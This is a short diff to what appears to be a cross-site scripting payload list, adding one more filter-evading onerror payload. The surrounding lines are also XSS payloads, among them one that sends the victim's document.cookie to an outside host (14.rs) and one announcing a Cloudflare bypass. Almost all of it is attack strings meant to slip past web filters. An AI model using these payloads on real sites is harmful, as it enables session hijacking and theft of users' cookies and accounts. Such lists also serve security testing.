@@ -98,6 +98,7 @@ javascript%3Alocation%2f**%2f=%27https://14.rs/?%27%2bdocument.cookie
 //<![CDATA[alert/*️⃣comment*/(1);//]]><script xlink:href="#"></script>
 <Svg%20Only=1%20OnLoad=confirm(atob(%27Q2xvdWRmbGFyZSBieXBhc3NlZA==%27))>
 '>+<script>alert(69)</script>
+1;/*'"><Img/Src/OnError=/**/confirm(1)//>
 </<K><Svg Onload=alert(1)>
 </<Kno XSS="><Svg Onload=alert(1)>
 <!<K><Svg Onload=alert(1)>
